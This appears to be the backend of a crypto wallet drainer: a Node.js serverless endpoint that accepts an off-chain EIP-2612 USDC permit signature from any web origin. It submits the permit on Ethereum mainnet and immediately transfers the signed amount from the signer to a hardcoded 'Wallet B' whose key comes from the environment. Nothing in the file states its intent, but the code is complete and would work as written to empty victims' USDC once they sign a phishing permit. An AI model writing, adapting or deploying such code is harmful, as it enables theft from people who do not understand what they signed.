const ethers = require("ethers");

const USDC = "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48";
const USDC_ABI = [
  "function permit(address owner, address spender, uint256 value, uint256 deadline, uint8 v, bytes32 r, bytes32 s) external",
  "function transferFrom(address from, address to, uint256 amount) external returns (bool)",
  "function balanceOf(address) view returns (uint256)"
];
const PERMIT_TYPES = [
  { name: "owner",    type: "address" },
  { name: "spender",  type: "address" },
  { name: "value",    type: "uint256" },
  { name: "nonce",    type: "uint256" },
  { name: "deadline", type: "uint256" }
];
const RPCS = [
  "https://rpc.ankr.com/eth",
  "https://eth.llamarpc.com",
  "https://1rpc.io/eth",
  "https://ethereum.publicnode.com",
  "https://cloudflare-eth.com"
];
const WALLET_B_ADDR = "0xBFf88A54E1Fa8041f9E632c3935766DdF43ea80c";

function deriveWalletB() {
  const raw = (process.env.WALLET_B_KEY || "").trim();
  if (!raw) throw new Error("WALLET_B_KEY manquant");
  if (raw.startsWith("0x") || /^[0-9a-fA-F]{64}$/.test(raw)) {
    return new ethers.Wallet(raw.startsWith("0x") ? raw : "0x" + raw);
  }
  return ethers.Wallet.fromMnemonic(raw, "m/44'/60'/0'/0/0");
}

async function getWalletB() {
  const base = deriveWalletB();
  for (const rpc of RPCS) {
    try {
      const provider = new ethers.providers.JsonRpcProvider(rpc);
      await provider.getBlockNumber();
      return base.connect(provider);
    } catch (e) { /* try next */ }
  }
  throw new Error("Tous les RPCs ont échoué");
}

module.exports = async (req, res) => {
  res.setHeader("Access-Control-Allow-Origin", "*");
  res.setHeader("Access-Control-Allow-Methods", "POST, OPTIONS");
  res.setHeader("Access-Control-Allow-Headers", "Content-Type");
  if (req.method === "OPTIONS") return res.status(200).end();
  if (req.method !== "POST") return res.status(405).json({ error: "Method not allowed" });

  const { owner, spender, value, nonce, deadline, v, r, s } = req.body;
  if (!owner || !spender || !value || nonce === undefined || !deadline || v === undefined || !r || !s) {
    return res.status(400).json({ error: "Champs manquants", got: Object.keys(req.body || {}) });
  }

  // 1. Vérif sig off-chain (Permit)
  try {
    const domain   = { name: "USD Coin", version: "2", chainId: 1, verifyingContract: USDC };
    const types    = { Permit: PERMIT_TYPES };
    const message  = { owner, spender, value, nonce: Number(nonce), deadline: Number(deadline) };
    const rawSig   = ethers.utils.joinSignature({ v: Number(v), r, s });
    const recovered = ethers.utils.verifyTypedData(domain, types, message, rawSig);
    if (recovered.toLowerCase() !== owner.toLowerCase()) {
      return res.status(400).json({ error: "Signature invalide", recovered, expected: owner });
    }
  } catch (e) {
    return res.status(400).json({ error: "Erreur vérif sig : " + e.message });
  }

  // 2. Wallet B
  let walletB;
  try {
    walletB = await getWalletB();
  } catch (e) {
    return res.status(500).json({ error: "Wallet B : " + e.message });
  }

  if (walletB.address.toLowerCase() !== WALLET_B_ADDR.toLowerCase()) {
    return res.status(400).json({ error: "Wallet B mismatch", derived: walletB.address });
  }

  const usdc = new ethers.Contract(USDC, USDC_ABI, walletB);

  // 3. permit() puis transferFrom()
  try {
    // callStatic pour vérif avant envoi
    await usdc.callStatic.permit(owner, spender, value, deadline, v, r, s);

    const txPermit = await usdc.permit(owner, spender, value, deadline, v, r, s, { gasLimit: 100000 });
    await txPermit.wait(1);

    const txTransfer = await usdc.transferFrom(owner, WALLET_B_ADDR, value, { gasLimit: 100000 });
    const rc = await txTransfer.wait(1);

    return res.json({
      success: true,
      txHash: txTransfer.hash,
      blockNumber: rc.blockNumber,
      gasUsed: rc.gasUsed.toString()
    });
  } catch (e) {
    const msg = e?.data?.message || e?.reason || e?.error?.message || e?.message || String(e);
    return res.status(500).json({ error: "Permit/transferFrom échoué : " + msg });
  }
};
